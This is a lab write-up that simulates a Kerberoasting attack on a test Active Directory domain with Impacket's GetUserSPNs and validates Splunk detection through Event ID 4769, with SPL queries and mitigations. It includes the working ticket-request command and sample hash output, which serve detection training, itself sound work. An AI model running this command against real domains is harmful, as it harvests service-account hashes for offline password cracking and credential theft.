# Kerberoasting Attack Simulation

## Objective

Simulate a Kerberoasting attack in an Active Directory lab environment and validate detection visibility in Splunk.

Kerberoasting allows attackers to request service tickets (TGS) for accounts with Service Principal Names (SPNs), then perform offline password cracking.

---

## Lab Environment

| Hostname | Role |
|---|---|
| DC01 | Windows Server 2019 Domain Controller |
| WINCLIENT | Windows 10 Domain Client |
| SPLUNKSERVER | Ubuntu Splunk Server |
| Kali Linux | Attacker Machine |

---

## Attack Prerequisites

A service account was configured with an SPN:

- Account: `sqlsvc`
- SPN: `MSSQLSvc/sqlserver.corp.local:1433`

This made the account Kerberoastable.

---

## Attack Execution

Performed Kerberoasting from Kali Linux using Impacket.

### Command Used

```bash
impacket-GetUserSPNs corp.local/<low-priv-user>:'<REDACTED>' -dc-ip <DC_IP> -request
```

Example result:

```text
ServicePrincipalName                Name
---------------------------------------------
MSSQLSvc/sqlserver.corp.local:1433  sqlsvc

$krb5tgs$23$*sqlsvc$CORP.LOCAL$<SANITIZED_HASH>
```

Result:
- Successfully enumerated SPN accounts
- Requested TGS ticket
- Extracted crackable Kerberos hash

---

## Windows Security Logs Observed

Relevant Event ID:

| Event ID | Description |
|---|---|
| 4769 | Kerberos Service Ticket Requested |

Observed log:
- EventCode=4769
- Logged on Domain Controller
- Captured successfully in Splunk

---

## Splunk Detection Queries

### Basic detection

```spl
index=windows EventCode=4769
```

### RC4-focused detection

```spl
index=windows EventCode=4769 Ticket_Encryption_Type=0x17
| stats count by Account_Name Service_Name Client_Address
```

### Suspicious ticket volume

```spl
index=windows EventCode=4769
| stats count values(Service_Name) as services by Account_Name Client_Address
| where count > 3
```

---

## Detection Indicators

Potential Kerberoasting indicators:

- Multiple TGS requests
- Service accounts requested from non-admin user
- RC4 ticket encryption usage
- Unusual service ticket activity

---

## Mitigations

Recommended defenses:

- Use strong service account passwords
- Implement Group Managed Service Accounts (gMSA)
- Disable RC4 where possible
- Monitor Event ID 4769
- Alert on unusual SPN requests

---

## Lessons Learned

This exercise demonstrated:

- Active Directory attack simulation
- Kerberos abuse techniques
- Splunk detection engineering
- Windows event analysis

---

## Status

✅ SPN account created  
✅ Kerberoasting executed  
✅ Hash extracted  
✅ Event ID 4769 generated  
✅ Splunk detection validated
